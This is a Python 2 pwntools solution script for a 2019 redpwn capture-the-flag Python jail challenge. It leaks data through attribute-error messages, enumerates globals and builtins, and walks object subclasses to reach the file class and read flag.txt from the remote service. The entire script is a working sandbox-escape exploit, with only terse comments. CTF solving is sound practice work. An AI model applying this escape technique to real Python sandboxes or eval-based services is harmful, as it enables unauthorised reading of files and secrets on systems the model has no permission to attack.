# coding: utf-8
from pwn import *
import re
​
def red(prt):
    return "\033[91m{}\033[00m".format(prt)
def grn(prt):
    return "\033[92m{}\033[00m".format(prt)
def cyn(prt):
    return "\033[96m{}\033[00m".format(prt)
def flag(stuff):
    inner = re.search(r"\{.+\}", stuff).group()
    return  stuff.replace('flag', cyn('flag')).replace(inner.strip('{}'), red(inner.strip('{}'))).replace('{', grn('{')).replace('}', grn('}'))
​
r = remote('chall2.2019.redpwn.net', 6007)
print r.recv()
​
def s(stuff):
    r.sendline(stuff)
    while r.can_recv(timeout=0.5):
        m = r.recv()
        print m
    return m
​
### Can we see globals()? ###
z = "a=globals()"
s(z)
z = "__package__.__getattribute__(str(c))"
s(z)
​
### Damn, print() cuts off a lot of data... ###
### How many objects are we talking...? ###
z = "a=globals().items()"
s(z)
z = "b=len(a)"
s(z)
z = "__package__.__getattribute__(str(b))"
msg = s(z)
​
num_vars = int(msg.split('attribute ')[1].strip('\n\''))
variables = []
for i in range(num_vars):
    z = "__package__.__getattribute__(str(a["+str(i)+"]))"
    variables.append(s(z).split('attribute ')[1].strip())
​
### Interesting... Let's see what's in the local scope ###
z = "a=dir()"
s(z)
z = "__package__.__getattribute__(str(a))"
s(z)
​
### yay, __builtins___ ###
z = "a=type(__builtins__)"
s(z)
z = "__package__.__getattribute__(str(a))"
s(z)
​
z = "a=dir(__builtins__)"
s(z)
z = "__package__.__getattribute__(str(a))"
s(z)
​
### Cool, explore dict type
z = "a=dir({})"
s(z)
z = "__package__.__getattribute__(str(a))"
s(z)
​
### Look into classes, do we have bases subclasses...? ###
z = "a={}.__class__"
s(z)
z = "__package__.__getattribute__(str(a))"
s(z)
​
z = "a={}.__class__.__base__"
s(z)
z = "__package__.__getattribute__(str(a))"
s(z)
​
z = "a={}.__class__.__base__[0]"
s(z)
z = "__package__.__getattribute__(str(a))"
s(z)
​
z = "a={}.__class__.__base__.__subclasses__()"
s(z)
z = "__package__.__getattribute__(str(a))"
s(z)
​
### How many objects are we talking...? ###
z = "b=len(a)"
s(z)
z = "__package__.__getattribute__(str(b))"
msg = s(z)
​
num_objects = int(msg.split('attribute ')[1].strip('\n\''))
objects = []
for i in range(num_objects):
    z = "__package__.__getattribute__(str(a["+str(i)+"]))"
    msg = s(z)
    try:
        objects.append(msg.split('attribute ')[1].strip())
    except:
        objects.append(msg.strip())
​
for i, p in enumerate(objects):
    if 'file' in str(p):
        print i, p
​
### file obj can opern and read files :) ###
z = "a={}.__class__.__base__.__subclasses__()[40]('./flag.txt').read()"
s(z)
z = "__package__.__getattribute__(str(a))"
msg = s(z)
​
if 'flag' in msg:
    print flag(msg.split('attribute ')[1].strip('\n\''))
    with open('flag.txt', 'w') as f:
        f.write(flag(msg.split('attribute ')[1].strip('\n\'')))
​
r.close()
